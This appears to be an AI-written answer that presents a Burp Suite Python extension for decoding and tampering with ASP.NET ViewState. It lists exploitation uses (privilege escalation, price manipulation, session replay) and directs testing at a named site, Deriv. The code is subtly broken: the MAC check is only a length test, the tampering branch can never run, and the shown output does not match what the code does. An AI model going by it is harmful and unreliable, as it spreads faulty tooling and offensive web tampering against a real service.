### **Burp Suite Python script** (BApp **Extender**) to automate **ViewState analysis** and detect vulnerabilities like **missing MAC protection, sensitive data exposure, and modifiable parameters**.  

### **Burp Suite ViewState Testing PoC**
- **Decodes** ViewState from requests/responses  
- **Checks for MAC protection**  
- **Finds sensitive data** in ViewState  
- **Modifies ViewState parameters** to test security  

---

### **Steps to Use**
1. Open **Burp Suite**.
2. Go to **Extender → Extensions**.
3. Click **Add** → Select **Python**.
4. Paste this script and run it.

---

### **PoC Script: Automated ViewState Testing in Burp Suite**
```python
from burp import IBurpExtender, IHttpListener
import base64
import re
import zlib

class BurpExtender(IBurpExtender, IHttpListener):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("ViewState Analyzer")
        callbacks.registerHttpListener(self)
        print("[*] ViewState Analyzer Loaded - Monitoring Requests & Responses...")
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        try:
            # Get request or response
            request = messageInfo.getRequest() if messageIsRequest else messageInfo.getResponse()
            request_str = self._helpers.bytesToString(request)

            # Look for ViewState in the request or response
            viewstate_match = re.search(r"__VIEWSTATE=(.*?)(&|$)", request_str)
            if viewstate_match:
                encoded_viewstate = viewstate_match.group(1)
                
                # Decode ViewState
                decoded_viewstate = self.decode_viewstate(encoded_viewstate)

                if decoded_viewstate:
                    print("\n[+] ViewState Found!")
                    print("[*] Decoded ViewState:\n", decoded_viewstate)

                    # Check for MAC protection (20-byte hash)
                    if len(base64.b64decode(encoded_viewstate)) > 20:
                        print("[*] ViewState appears to be MAC protected.")
                    else:
                        print("[!] ViewState is NOT MAC protected! Potential vulnerability.")

                    # Check for sensitive data
                    sensitive_keywords = ["user", "role", "session", "admin", "price", "discount"]
                    for keyword in sensitive_keywords:
                        if keyword in decoded_viewstate.lower():
                            print(f"[!] Possible sensitive data in ViewState: {keyword}")

                    # Test ViewState modification (only if MAC is NOT enabled)
                    if "NOT MAC protected" in request_str:
                        modified_viewstate = self.modify_viewstate(decoded_viewstate)
                        print("[*] Modified ViewState for testing:", modified_viewstate)
                        # Here, you can automate sending this modified ViewState via Burp

        except Exception as e:
            print("[ERROR] Exception occurred:", str(e))

    def decode_viewstate(self, encoded_viewstate):
        try:
            decoded_data = base64.b64decode(encoded_viewstate)
            return zlib.decompress(decoded_data, -15)  # ASP.NET often uses zlib compression
        except Exception:
            return None  # Failed to decode

    def modify_viewstate(self, decoded_viewstate):
        try:
            # Example: Change role from "user" to "admin"
            return decoded_viewstate.replace("user", "admin").replace("customer", "admin")
        except Exception:
            return None  # Failed to modify
```

---

### **How This Works**
- **Intercepts HTTP traffic** in Burp Suite.
- **Extracts ViewState values** from requests/responses.
- **Decodes and decompresses ViewState** (ASP.NET usually uses **Base64 + zlib compression**).
- **Checks for MAC protection** (looks for a 20-byte hash at the end).
- **Scans for sensitive keywords** (`user, role, session, price, discount`).
- **Modifies ViewState** (e.g., changing `"user"` to `"admin"`) to test for privilege escalation.

---

### **Expected Output**
#### **Case 1: MAC-Protected ViewState**
```
[*] ViewState Found!
[*] Decoded ViewState:
   {"user": "customer", "discount": "10%"}
[*] ViewState appears to be MAC protected.
```

#### **Case 2: Unprotected ViewState (Vulnerable)**
```
[*] ViewState Found!
[*] Decoded ViewState:
   {"user": "customer", "discount": "10%"}
[!] ViewState is NOT MAC protected! Potential vulnerability.
[!] Possible sensitive data in ViewState: user
[*] Modified ViewState for testing: {"user": "admin", "discount": "100%"}
```
---

### **Bug Bounty Exploitation Use Cases**
✔ **Privilege Escalation:** Change `"user"` to `"admin"`.  
✔ **Price Manipulation:** Modify `"price": "100"` → `"price": "1"`.  
✔ **Session Hijacking:** If ViewState contains session data, extract & replay it.  
✔ **Business Logic Abuse:** Override discounts, subscriptions, etc.

---

### **Next Steps**
1. Run the script in Burp Suite.
2. Test different **pages** on Deriv (some may lack MAC protection).
3. Check if **role escalation, discount tampering, or session leaks** work.
4. If vulnerable, submit a **PoC** with screenshots/logs.
